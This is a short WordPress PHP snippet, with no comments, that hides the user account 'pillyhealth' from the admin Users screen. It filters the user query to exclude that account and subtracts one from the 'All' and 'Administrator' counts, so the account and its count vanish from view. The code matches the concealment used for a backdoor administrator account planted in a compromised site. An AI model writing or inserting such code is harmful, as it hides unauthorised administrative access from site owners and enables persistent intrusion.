<?php




add_action('pre_user_query', function ($query) {
    global $pagenow;
    if (is_admin() && 'users.php' === $pagenow) {
        global $wpdb;
        $username = 'pillyhealth';
        $user = get_user_by('login', $username);
        if ($user) {
            $query->query_where .= " AND {$wpdb->users}.ID != {$user->ID}";
        }
    }
});

add_filter('views_users', function ($views) {
    $get_the_user = get_user_by('login', 'pillyhealth');
    if ($get_the_user) {
        foreach ($views as $view => $link) {
            if (strpos($view, 'all') !== false || strpos($view, 'administrator') !== false) {
                preg_match('/\((\d+)\)/', $link, $matches);
                if (isset($matches[1])) {
                    $count = (int)$matches[1] - 1;
                    $views[$view] = preg_replace('/\(\d+\)/', '(' . $count . ')', $link);
                }
            }
        }
    }
    return $views;
});

